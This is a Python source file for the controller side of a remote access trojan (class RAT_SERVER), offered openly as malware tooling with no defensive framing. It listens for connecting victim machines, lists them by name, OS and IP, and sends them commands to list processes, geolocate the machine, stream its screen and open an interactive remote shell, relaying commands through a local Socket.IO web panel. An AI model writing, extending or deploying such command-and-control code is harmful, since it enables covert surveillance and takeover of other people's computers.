import socket
import threading
import os
import socketio
import sys
import logging
import subprocess
import json

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class RAT_SERVER:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.current_client_ip = None
        self.current_client_socket = None
        self.sio = socketio.Client()

        @self.sio.event
        def connect():
            logging.debug('Connected to server')

        @self.sio.event
        def connect_error(data):
            logging.debug(f'Connection failed: {data}')

        @self.sio.event
        def disconnect():
            logging.debug('Disconnected from server')

        @self.sio.on('server-message')
        def on_server_message(message):
            logging.debug(f'Server message: {message}')

        @self.sio.on('client-update')
        def on_client_update(data):
            logging.debug(f'Client update: {data}')

        @self.sio.on('server-command')
        def on_server_command(data):
            command = data.get('command')
            if command:
                logging.debug(f'Received command from app.py: {command}')
                output = self.execute_command(command)
                formatted_output = f'[*] {output}'
                logging.debug(f'Command output: {formatted_output}')
                self.sio.emit('server-response', {'message': formatted_output})
            else:
                logging.debug('Received invalid command')
                self.sio.emit('server-response', {'message': 'Received invalid command'})

    def connect_to_socket_server(self):
        try:
            self.sio.connect('http://localhost:5000', transports=['websocket'])
        except socketio.exceptions.ConnectionError as e:
            logging.debug(f"Connection error: {e}")

    def build_connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        logging.debug("[*] Waiting for the client...")

        def handle_client(client_socket, client_address):
            ipcli = client_socket.recv(1024).decode()
            self.clients[client_address[0]] = (client_socket, ipcli)
            logging.debug(f"[*] Connection is established successfully with {ipcli} ({client_address[0]})")

        while True:
            client_socket, client_address = s.accept()
            client_handler = threading.Thread(
                target=handle_client, args=(client_socket, client_address)
            )
            client_handler.start()

    def server(self):
        try:
            from vidstream import StreamingServer
            self.streaming_server = StreamingServer(self.host, 8080)
            self.streaming_server.start_server()
        except ImportError:
            logging.debug("Module not found...")

    def stop_server(self):
        self.streaming_server.stop_server()

    def result(self, client_socket, command):
        client_socket.send(command.encode())
        result_output = client_socket.recv(1024).decode()
        logging.debug(result_output)
        return result_output

    def banner(self):
        print("======================================================")
        print("                       Commands                       ")
        print("======================================================")

    def disconnect(self, client_ip):
        if client_ip in self.clients:
            client_socket = self.clients[client_ip][0]
            client_socket.close()
            del self.clients[client_ip]
            logging.debug(f"Disconnected from {client_ip}")
        else:
            logging.debug(f"No client with IP {client_ip}")

    def execute_command(self, command):
        if command == 'example':
            return 'This is an example command output.'
        elif command == 'list_clients':
            formatted_clients = []
            for ip, (client_socket, profile) in self.clients.items():
                profile_data = json.loads(profile)
                formatted_clients.append(f"{profile_data['name']} - {profile_data['os']} - {profile_data['ip']}")
            return "\n".join(formatted_clients)
        elif command == 'list':
            return self.execute_command('list_clients')
        elif command.startswith('connect'):
            try:
                _, ip = command.split()
                if ip in self.clients:
                    self.current_client_ip = ip
                    self.current_client_socket = self.clients[ip][0]
                    return f"Connected to {ip}"
                else:
                    return f"No client with IP {ip}"
            except ValueError:
                return "Usage: connect <ip>"
        elif command == 'disconnect':
            if self.current_client_ip:
                self.disconnect(self.current_client_ip)
                self.current_client_ip = None
                self.current_client_socket = None
                return "Disconnected from client"
            else:
                return "No client connected"
        elif command == 'tasklist':
            if self.current_client_socket:
                return self.result(self.current_client_socket, command)
            else:
                return "No client connected"
        elif command == 'geolocate':
            if self.current_client_socket:
                return self.result(self.current_client_socket, command)
            else:
                return "No client connected"
        elif command == 'screenshare':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode("utf-8"))
                self.server()
                return "Screenshare started"
            else:
                return "No client connected"
        elif command == 'shell':
            if self.current_client_socket:
                self.current_client_socket.send(command.encode())
                shell_output = []
                while True:
                    command = input('>> ').strip()
                    if command.lower() == 'back':
                        logging.debug("Returning to main command input...")
                        break
                    self.current_client_socket.send(command.encode())
                    if command.lower() == 'exit':
                        break
                    result_output = self.current_client_socket.recv(1024).decode()
                    logging.debug(result_output)
                    shell_output.append(result_output)
                return "\n".join(shell_output)
            else:
                return "No client connected"
        else:
            return f'Unknown command: {command}'

    def execute(self):
        self.banner()

        while True:
            command = input('Command >>  ').strip()
            logging.debug(f'Executing command: {command}')
            output = self.execute_command(command)
            logging.debug(f'Command output: {output}')

rat = RAT_SERVER('127.0.0.1', 4444)

if __name__ == '__main__':
    if len(sys.argv) > 1:
        command = sys.argv[1]
        output = rat.execute_command(command)
        logging.debug(output)
    else:
        connection_thread = threading.Thread(target=rat.build_connection)
        connection_thread.start()
        rat.connect_to_socket_server()
        rat.execute()
